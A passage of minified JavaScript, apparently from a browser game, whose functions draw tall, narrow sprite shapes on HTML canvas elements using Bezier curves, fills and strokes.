                    r.bezierCurveTo(4 * e, 98 * e, 15 * e, 130 * e, 64 * e, 130 * e),
                    r.bezierCurveTo(76 * e, 129 * e, 95 * e, 113 * e, 97 * e, 97 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 403 * e),
                    r.bezierCurveTo(47 * e, 412 * e, 58 * e, 412 * e, 67 * e, 403 * e),
                    r.bezierCurveTo(66.5 * e, 434 * e, 66.5 * e, 434 * e, 66 * e, 465 * e),
                    r.bezierCurveTo(56 * e, 480 * e, 40 * e, 472 * e, 36 * e, 465 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(37 * e, 427 * e),
                    r.bezierCurveTo(47 * e, 435 * e, 55 * e, 435 * e, 67 * e, 427 * e),
                    he(r, void 0, i[8], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(36 * e, 448 * e),
                    r.bezierCurveTo(46 * e, 454 * e, 54 * e, 457 * e, 65 * e, 449 * e),
                    he(r, void 0, i[8], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(55 * e, 176 * e),
                    r.bezierCurveTo(74 * e, 175 * e, 82 * e, 169 * e, 96 * e, 155 * e),
                    r.bezierCurveTo(103 * e, 183 * e, 95 * e, 214 * e, 54 * e, 219 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(50 * e, 176 * e),
                    r.bezierCurveTo(25 * e, 177 * e, 16 * e, 164 * e, 7 * e, 156 * e),
                    r.bezierCurveTo(0 * e, 186 * e, 10 * e, 201 * e, 43 * e, 220 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(59 * e, 67 * e),
                    r.bezierCurveTo(47 * e, 97 * e, 18 * e, 117 * e, 11 * e, 110 * e),
                    r.bezierCurveTo(11 * e, 115 * e, 15 * e, 122 * e, 23 * e, 124 * e),
                    r.bezierCurveTo(46 * e, 118 * e, 52 * e, 113 * e, 62 * e, 86 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 125 * e),
                    r.bezierCurveTo(47 * e, 136 * e, 57 * e, 134 * e, 77 * e, 127 * e),
                    r.bezierCurveTo(71 * e, 158 * e, 71 * e, 159 * e, 66 * e, 159 * e),
                    r.bezierCurveTo(50.5 * e, 156.5 * e, 50.5 * e, 156.5 * e, 35 * e, 154 * e),
                    r.bezierCurveTo(31 * e, 145 * e, 31 * e, 136 * e, 31 * e, 125 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 171 * e),
                    r.bezierCurveTo(32 * e, 221 * e, 43 * e, 233 * e, 70 * e, 247 * e),
                    r.bezierCurveTo(75 * e, 234 * e, 75 * e, 230 * e, 72 * e, 221 * e),
                    r.bezierCurveTo(48 * e, 206 * e, 54 * e, 188 * e, 50 * e, 176 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(60 * e, 68 * e),
                    r.bezierCurveTo(63 * e, 69 * e, 65 * e, 71 * e, 67 * e, 77 * e),
                    r.bezierCurveTo(61 * e, 123 * e, 52 * e, 137 * e, 42 * e, 150 * e),
                    r.bezierCurveTo(38 * e, 151 * e, 38 * e, 151 * e, 34 * e, 152 * e),
                    r.bezierCurveTo(33 * e, 146.5 * e, 33 * e, 146.5 * e, 32 * e, 141 * e),
                    r.bezierCurveTo(49 * e, 118 * e, 63 * e, 87 * e, 59 * e, 68 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(71 * e, 172 * e),
                    r.bezierCurveTo(56 * e, 222 * e, 49 * e, 234 * e, 35 * e, 248 * e),
                    r.bezierCurveTo(30 * e, 236 * e, 30 * e, 230 * e, 31 * e, 217 * e),
                    r.bezierCurveTo(44 * e, 202 * e, 49 * e, 191 * e, 52 * e, 172 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 151 * e),
                    r.bezierCurveTo(27 * e, 165 * e, 31 * e, 173 * e, 36 * e, 178 * e),
                    r.bezierCurveTo(56 * e, 185 * e, 73 * e, 184 * e, 71 * e, 170 * e),
                    r.bezierCurveTo(72 * e, 154 * e, 71 * e, 154 * e, 63 * e, 155 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(53 * e, 113 * e),
                    r.bezierCurveTo(65 * e, 140 * e, 75 * e, 166 * e, 52 * e, 169 * e),
                    r.bezierCurveTo(29 * e, 168 * e, 41 * e, 143 * e, 53 * e, 112 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 6 * e),
                    n
            }
            function Ft(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 81 * e,
                    n.height = 626 * e,
                    r.translate(20 * e, 20 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(55 * e, 565 * e),
                    r.bezierCurveTo(56 * e, 586 * e, 53 * e, 591 * e, 40 * e, 592 * e),
                    r.bezierCurveTo(28 * e, 591 * e, 27 * e, 583 * e, 28 * e, 557 * e),
                    r.bezierCurveTo(27.5 * e, 346 * e, 27.5 * e, 346 * e, 27 * e, 135 * e),
                    r.bezierCurveTo(26 * e, 74 * e, 36 * e, 26 * e, 41 * e, 15 * e),
                    r.bezierCurveTo(54 * e, 51 * e, 54 * e, 81 * e, 55 * e, 128 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(-20 * e, -20 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(55 * e, 565 * e),
                    r.bezierCurveTo(56 * e, 586 * e, 53 * e, 591 * e, 40 * e, 592 * e),
                    r.bezierCurveTo(28 * e, 591 * e, 27 * e, 583 * e, 28 * e, 557 * e),
                    r.bezierCurveTo(27.5 * e, 346 * e, 27.5 * e, 346 * e, 27 * e, 135 * e),
                    r.bezierCurveTo(26 * e, 74 * e, 36 * e, 26 * e, 41 * e, 15 * e),
                    r.bezierCurveTo(54 * e, 51 * e, 54 * e, 81 * e, 55 * e, 128 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(27 * e, 129 * e),
                    r.bezierCurveTo(32 * e, 135 * e, 48 * e, 136 * e, 53 * e, 129 * e),
                    r.bezierCurveTo(56 * e, 97 * e, 53 * e, 82 * e, 52 * e, 64 * e),
                    r.bezierCurveTo(49 * e, 33 * e, 44 * e, 27 * e, 41 * e, 21 * e),
                    r.bezierCurveTo(31 * e, 40 * e, 28 * e, 84 * e, 27 * e, 127 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(55 * e, 565 * e),
                    r.bezierCurveTo(56 * e, 586 * e, 53 * e, 591 * e, 40 * e, 592 * e),
                    r.bezierCurveTo(28 * e, 591 * e, 27 * e, 583 * e, 28 * e, 557 * e),
                    r.bezierCurveTo(27.5 * e, 346 * e, 27.5 * e, 346 * e, 27 * e, 135 * e),
                    r.bezierCurveTo(26 * e, 74 * e, 36 * e, 26 * e, 41 * e, 15 * e),
                    r.bezierCurveTo(54 * e, 51 * e, 54 * e, 81 * e, 55 * e, 128 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(28 * e, 475 * e),
                    r.bezierCurveTo(38 * e, 482 * e, 48 * e, 480 * e, 54 * e, 474 * e),
                    r.bezierCurveTo(54 * e, 509.5 * e, 54 * e, 509.5 * e, 54 * e, 545 * e),
                    r.bezierCurveTo(46 * e, 554 * e, 36 * e, 552 * e, 28 * e, 545 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(28 * e, 496 * e),
                    r.bezierCurveTo(39 * e, 506 * e, 49 * e, 503 * e, 54 * e, 496 * e),
                    he(r, void 0, i[5], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(28 * e, 521 * e),
                    r.bezierCurveTo(41 * e, 529 * e, 49 * e, 524 * e, 54 * e, 520 * e),
                    he(r, void 0, i[5], 8 * e),
                    n
            }
            function xt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 100 * e,
                    n.height = 648 * e,
                    r.translate(20 * e, 20 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(50.5 * e, 349.5 * e),
                    Ve(r, -13.5 * e, -249.5 * e, 27 * e, 499 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(36 * e, 538 * e),
                    r.bezierCurveTo(49.5 * e, 538 * e, 49.5 * e, 538 * e, 63 * e, 538 * e),
                    r.bezierCurveTo(63.5 * e, 568 * e, 63.5 * e, 568 * e, 64 * e, 598 * e),
                    r.bezierCurveTo(50 * e, 598 * e, 50 * e, 598 * e, 36 * e, 598 * e),
                    r.bezierCurveTo(36 * e, 568.5 * e, 36 * e, 568.5 * e, 36 * e, 539 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(36 * e, 554 * e),
                    r.bezierCurveTo(45 * e, 561 * e, 56 * e, 558 * e, 63 * e, 554 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(32 * e, 569 * e),
                    r.bezierCurveTo(44 * e, 576 * e, 58 * e, 574 * e, 68 * e, 569 * e),
                    r.bezierCurveTo(68 * e, 584 * e, 68 * e, 584 * e, 68 * e, 599 * e),
                    r.bezierCurveTo(68 * e, 608 * e, 65 * e, 618 * e, 49 * e, 617 * e),
                    r.bezierCurveTo(34 * e, 617 * e, 32 * e, 610 * e, 32 * e, 598 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(41 * e, 581 * e),
                    r.bezierCurveTo(48 * e, 584 * e, 55 * e, 583 * e, 60 * e, 581 * e),
                    r.bezierCurveTo(60 * e, 589.5 * e, 60 * e, 589.5 * e, 60 * e, 598 * e),
                    r.bezierCurveTo(60 * e, 604 * e, 59 * e, 609 * e, 48 * e, 608 * e),
                    r.bezierCurveTo(40 * e, 607 * e, 40 * e, 606 * e, 41 * e, 581 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(31 * e, 106 * e),
                    r.bezierCurveTo(31 * e, 124.5 * e, 31 * e, 124.5 * e, 31 * e, 143 * e),
                    r.bezierCurveTo(31 * e, 163 * e, 38 * e, 169 * e, 48 * e, 168 * e),
                    r.bezierCurveTo(57 * e, 168 * e, 67 * e, 165 * e, 67 * e, 148 * e),
                    r.bezierCurveTo(67 * e, 123.5 * e, 67 * e, 123.5 * e, 67 * e, 99 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(49 * e, 27 * e),
                    r.bezierCurveTo(64 * e, 62.5 * e, 64 * e, 62.5 * e, 79 * e, 98 * e),
                    r.bezierCurveTo(74 * e, 113 * e, 63 * e, 121 * e, 50 * e, 122 * e),
                    r.bezierCurveTo(35 * e, 123 * e, 22 * e, 109 * e, 20 * e, 98 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(49 * e, 43 * e),
                    r.bezierCurveTo(61 * e, 70 * e, 61 * e, 70 * e, 73 * e, 97 * e),
                    r.bezierCurveTo(66 * e, 116 * e, 43 * e, 122 * e, 26 * e, 99 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(-20 * e, -20 * e),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(50.5 * e, 349.5 * e),
                    Ve(r, -13.5 * e, -249.5 * e, 27 * e, 499 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(36 * e, 538 * e),
                    r.bezierCurveTo(49.5 * e, 538 * e, 49.5 * e, 538 * e, 63 * e, 538 * e),
                    r.bezierCurveTo(63.5 * e, 568 * e, 63.5 * e, 568 * e, 64 * e, 598 * e),
                    r.bezierCurveTo(50 * e, 598 * e, 50 * e, 598 * e, 36 * e, 598 * e),
                    r.bezierCurveTo(36 * e, 568.5 * e, 36 * e, 568.5 * e, 36 * e, 539 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(36 * e, 554 * e),
                    r.bezierCurveTo(45 * e, 561 * e, 56 * e, 558 * e, 63 * e, 554 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(32 * e, 569 * e),
                    r.bezierCurveTo(44 * e, 576 * e, 58 * e, 574 * e, 68 * e, 569 * e),
                    r.bezierCurveTo(68 * e, 584 * e, 68 * e, 584 * e, 68 * e, 599 * e),
                    r.bezierCurveTo(68 * e, 608 * e, 65 * e, 618 * e, 49 * e, 617 * e),
                    r.bezierCurveTo(34 * e, 617 * e, 32 * e, 610 * e, 32 * e, 598 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(41 * e, 581 * e),
                    r.bezierCurveTo(48 * e, 584 * e, 55 * e, 583 * e, 60 * e, 581 * e),
                    r.bezierCurveTo(60 * e, 589.5 * e, 60 * e, 589.5 * e, 60 * e, 598 * e),
                    r.bezierCurveTo(60 * e, 604 * e, 59 * e, 609 * e, 48 * e, 608 * e),
                    r.bezierCurveTo(40 * e, 607 * e, 40 * e, 606 * e, 41 * e, 581 * e),
                    r.closePath(),
                    he(r, i[7]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(31 * e, 106 * e),
                    r.bezierCurveTo(31 * e, 124.5 * e, 31 * e, 124.5 * e, 31 * e, 143 * e),
                    r.bezierCurveTo(31 * e, 163 * e, 38 * e, 169 * e, 48 * e, 168 * e),
                    r.bezierCurveTo(57 * e, 168 * e, 67 * e, 165 * e, 67 * e, 148 * e),
                    r.bezierCurveTo(67 * e, 123.5 * e, 67 * e, 123.5 * e, 67 * e, 99 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 8 * e),
                    r.save(),
                    r.translate(-46 * e, -50 * e),
                    r.scale(2, 2),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(51 * e, 80 * e),
                    r.bezierCurveTo(51 * e, 89.5 * e, 51 * e, 89.5 * e, 51 * e, 99 * e),
                    r.bezierCurveTo(49 * e, 103 * e, 46 * e, 105 * e, 44 * e, 99 * e),
                    r.bezierCurveTo(44 * e, 88.5 * e, 44 * e, 88.5 * e, 44 * e, 78 * e),
                    r.closePath(),
                    he(r, i[8]),
                    r.restore(),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(49 * e, 27 * e),
                    r.bezierCurveTo(64 * e, 62.5 * e, 64 * e, 62.5 * e, 79 * e, 98 * e),
                    r.bezierCurveTo(74 * e, 113 * e, 63 * e, 121 * e, 50 * e, 122 * e),
                    r.bezierCurveTo(35 * e, 123 * e, 22 * e, 109 * e, 20 * e, 98 * e),
                    r.closePath(),
                    he(r, i[8], i[9], 8 * e),
                    r.scale(2, 2),
                    r.translate(-23 * e, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(57 * e, 69 * e),
                    r.bezierCurveTo(50 * e, 76 * e, 43 * e, 75 * e, 38 * e, 69 * e),
                    r.bezierCurveTo(43 * e, 57 * e, 43 * e, 57 * e, 48 * e, 45 * e),
                    r.closePath(),
                    he(r, i[10]),
                    n
            }
            function Jt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 88 * e,
                    n.height = 647 * e,
                    r.translate(20 * e, 20 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(45 * e, 384.5 * e),
                    Ve(r, -15 * e, -216.5 * e, 30 * e, 433 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(27 * e, 572 * e),
                    r.bezierCurveTo(44 * e, 580 * e, 55 * e, 576 * e, 62 * e, 572 * e),
                    r.bezierCurveTo(65 * e, 585.5 * e, 65 * e, 585.5 * e, 68 * e, 599 * e),
                    r.bezierCurveTo(71 * e, 612 * e, 68 * e, 618 * e, 34 * e, 616 * e),
                    r.bezierCurveTo(14 * e, 615 * e, 19 * e, 607 * e, 27 * e, 573 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(32 * e, 587 * e),
                    r.bezierCurveTo(39 * e, 590 * e, 48 * e, 588 * e, 54 * e, 587 * e),
                    r.bezierCurveTo(57 * e, 604 * e, 59 * e, 609 * e, 46 * e, 609 * e),
                    r.bezierCurveTo(27 * e, 609 * e, 28 * e, 605 * e, 33 * e, 588 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(31 * e, 113 * e),
                    r.bezierCurveTo(27 * e, 139 * e, 27 * e, 139 * e, 23 * e, 165 * e),
                    r.bezierCurveTo(18 * e, 187 * e, 39 * e, 195 * e, 57 * e, 186 * e),
                    r.bezierCurveTo(68 * e, 180 * e, 65 * e, 171 * e, 62 * e, 153 * e),
                    r.bezierCurveTo(58.5 * e, 131 * e, 58.5 * e, 131 * e, 55 * e, 109 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(39 * e, 139 * e),
                    r.bezierCurveTo(43 * e, 139 * e, 43 * e, 139 * e, 47 * e, 139 * e),
                    r.bezierCurveTo(51 * e, 158 * e, 56 * e, 176 * e, 44 * e, 175 * e),
                    r.bezierCurveTo(33 * e, 177 * e, 34 * e, 167 * e, 39 * e, 140 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(44 * e, 29 * e),
                    r.bezierCurveTo(57 * e, 63 * e, 57 * e, 63 * e, 70 * e, 97 * e),
                    r.bezierCurveTo(60 * e, 111 * e, 60 * e, 111 * e, 50 * e, 125 * e),
                    r.bezierCurveTo(45 * e, 128 * e, 41 * e, 128 * e, 35 * e, 124 * e),
                    r.bezierCurveTo(26.5 * e, 110 * e, 26.5 * e, 110 * e, 18 * e, 96 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(44 * e, 54 * e),
                    r.bezierCurveTo(50 * e, 72 * e, 50 * e, 72 * e, 56 * e, 90 * e),
                    r.bezierCurveTo(58 * e, 94 * e, 59 * e, 98 * e, 53 * e, 105 * e),
                    r.bezierCurveTo(47 * e, 113 * e, 43 * e, 113 * e, 36 * e, 103 * e),
                    r.bezierCurveTo(29 * e, 96 * e, 31 * e, 94 * e, 35 * e, 83 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(-20 * e, -20 * e),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(45 * e, 384.5 * e),
                    Ve(r, -15 * e, -216.5 * e, 30 * e, 433 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(27 * e, 572 * e),
                    r.bezierCurveTo(44 * e, 580 * e, 55 * e, 576 * e, 62 * e, 572 * e),
                    r.bezierCurveTo(65 * e, 585.5 * e, 65 * e, 585.5 * e, 68 * e, 599 * e),
                    r.bezierCurveTo(71 * e, 612 * e, 68 * e, 618 * e, 34 * e, 616 * e),
                    r.bezierCurveTo(14 * e, 615 * e, 19 * e, 607 * e, 27 * e, 573 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(32 * e, 587 * e),
                    r.bezierCurveTo(39 * e, 590 * e, 48 * e, 588 * e, 54 * e, 587 * e),
                    r.bezierCurveTo(57 * e, 604 * e, 59 * e, 609 * e, 46 * e, 609 * e),
                    r.bezierCurveTo(27 * e, 609 * e, 28 * e, 605 * e, 33 * e, 588 * e),
                    r.closePath(),
                    he(r, i[5]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(31 * e, 113 * e),
                    r.bezierCurveTo(27 * e, 139 * e, 27 * e, 139 * e, 23 * e, 165 * e),
                    r.bezierCurveTo(18 * e, 187 * e, 39 * e, 195 * e, 57 * e, 186 * e),
                    r.bezierCurveTo(68 * e, 180 * e, 65 * e, 171 * e, 62 * e, 153 * e),
                    r.bezierCurveTo(58.5 * e, 131 * e, 58.5 * e, 131 * e, 55 * e, 109 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(39 * e, 139 * e),
                    r.bezierCurveTo(43 * e, 139 * e, 43 * e, 139 * e, 47 * e, 139 * e),
                    r.bezierCurveTo(51 * e, 158 * e, 56 * e, 176 * e, 44 * e, 175 * e),
                    r.bezierCurveTo(33 * e, 177 * e, 34 * e, 167 * e, 39 * e, 140 * e),
                    r.closePath(),
                    he(r, i[5]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(44 * e, 29 * e),
                    r.bezierCurveTo(57 * e, 63 * e, 57 * e, 63 * e, 70 * e, 97 * e),
                    r.bezierCurveTo(60 * e, 111 * e, 60 * e, 111 * e, 50 * e, 125 * e),
                    r.bezierCurveTo(45 * e, 128 * e, 41 * e, 128 * e, 35 * e, 124 * e),
                    r.bezierCurveTo(26.5 * e, 110 * e, 26.5 * e, 110 * e, 18 * e, 96 * e),
                    r.closePath(),
                    he(r, i[6], i[7], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(44 * e, 54 * e),
                    r.bezierCurveTo(50 * e, 72 * e, 50 * e, 72 * e, 56 * e, 90 * e),
                    r.bezierCurveTo(58 * e, 94 * e, 59 * e, 98 * e, 53 * e, 105 * e),
                    r.bezierCurveTo(47 * e, 113 * e, 43 * e, 113 * e, 36 * e, 103 * e),
                    r.bezierCurveTo(29 * e, 96 * e, 31 * e, 94 * e, 35 * e, 83 * e),
                    r.closePath(),
                    he(r, i[8]),
                    n
            }
            function Xt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 106 * e,
                    n.height = 681 * e,
                    r.translate(20 * e, 20 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(52.5 * e, 395 * e),
                    r.rotate(0),
                    Ve(r, -11.5 * e, -226 * e, 23 * e, 452 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 588 * e),
                    r.bezierCurveTo(47 * e, 596 * e, 61 * e, 594 * e, 69 * e, 588 * e),
                    r.bezierCurveTo(79 * e, 615 * e, 78 * e, 632 * e, 59 * e, 643 * e),
                    r.bezierCurveTo(41 * e, 650 * e, 27 * e, 632 * e, 30 * e, 610 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(52 * e, 135 * e),
                    r.bezierCurveTo(61.5 * e, 142 * e, 61.5 * e, 142 * e, 71 * e, 149 * e),
                    r.bezierCurveTo(69.5 * e, 166 * e, 69.5 * e, 166 * e, 68 * e, 183 * e),
                    r.bezierCurveTo(60.5 * e, 187.5 * e, 60.5 * e, 187.5 * e, 53 * e, 192 * e),
                    r.bezierCurveTo(45 * e, 187.5 * e, 45 * e, 187.5 * e, 37 * e, 183 * e),
                    r.bezierCurveTo(35.5 * e, 167 * e, 35.5 * e, 167 * e, 34 * e, 151 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(64 * e, 150 * e),
                    r.bezierCurveTo(63 * e, 164 * e, 63 * e, 164 * e, 62 * e, 178 * e),
                    r.bezierCurveTo(58 * e, 181 * e, 58 * e, 181 * e, 54 * e, 184 * e),
                    r.bezierCurveTo(48.5 * e, 181.5 * e, 48.5 * e, 181.5 * e, 43 * e, 179 * e),
                    r.bezierCurveTo(42 * e, 164.5 * e, 42 * e, 164.5 * e, 41 * e, 150 * e),
                    r.bezierCurveTo(46 * e, 152.5 * e, 46 * e, 152.5 * e, 51 * e, 155 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(52 * e, 39 * e),
                    r.bezierCurveTo(65.5 * e, 82 * e, 65.5 * e, 82 * e, 79 * e, 125 * e),
                    r.bezierCurveTo(66 * e, 137.5 * e, 66 * e, 137.5 * e, 53 * e, 150 * e),
                    r.bezierCurveTo(39 * e, 138 * e, 39 * e, 138 * e, 25 * e, 126 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(52 * e, 64 * e),
                    r.bezierCurveTo(60 * e, 92.5 * e, 60 * e, 92.5 * e, 68 * e, 121 * e),
                    r.bezierCurveTo(61 * e, 127.5 * e, 61 * e, 127.5 * e, 54 * e, 134 * e),
                    r.bezierCurveTo(46.5 * e, 127.5 * e, 46.5 * e, 127.5 * e, 39 * e, 121 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(-20 * e, -20 * e),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(52.5 * e, 395 * e),
                    r.rotate(0),
                    Ve(r, -11.5 * e, -226 * e, 23 * e, 452 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 588 * e),
                    r.bezierCurveTo(47 * e, 596 * e, 61 * e, 594 * e, 69 * e, 588 * e),
                    r.bezierCurveTo(79 * e, 615 * e, 78 * e, 632 * e, 59 * e, 643 * e),
                    r.bezierCurveTo(41 * e, 650 * e, 27 * e, 632 * e, 30 * e, 610 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(52 * e, 135 * e),
                    r.bezierCurveTo(61.5 * e, 142 * e, 61.5 * e, 142 * e, 71 * e, 149 * e),
                    r.bezierCurveTo(69.5 * e, 166 * e, 69.5 * e, 166 * e, 68 * e, 183 * e),
                    r.bezierCurveTo(60.5 * e, 187.5 * e, 60.5 * e, 187.5 * e, 53 * e, 192 * e),
                    r.bezierCurveTo(45 * e, 187.5 * e, 45 * e, 187.5 * e, 37 * e, 183 * e),
                    r.bezierCurveTo(35.5 * e, 167 * e, 35.5 * e, 167 * e, 34 * e, 151 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(64 * e, 150 * e),
                    r.bezierCurveTo(63 * e, 164 * e, 63 * e, 164 * e, 62 * e, 178 * e),
                    r.bezierCurveTo(58 * e, 181 * e, 58 * e, 181 * e, 54 * e, 184 * e),
                    r.bezierCurveTo(48.5 * e, 181.5 * e, 48.5 * e, 181.5 * e, 43 * e, 179 * e),
                    r.bezierCurveTo(42 * e, 164.5 * e, 42 * e, 164.5 * e, 41 * e, 150 * e),
                    r.bezierCurveTo(46 * e, 152.5 * e, 46 * e, 152.5 * e, 51 * e, 155 * e),
                    r.closePath(),
                    he(r, i[5]),
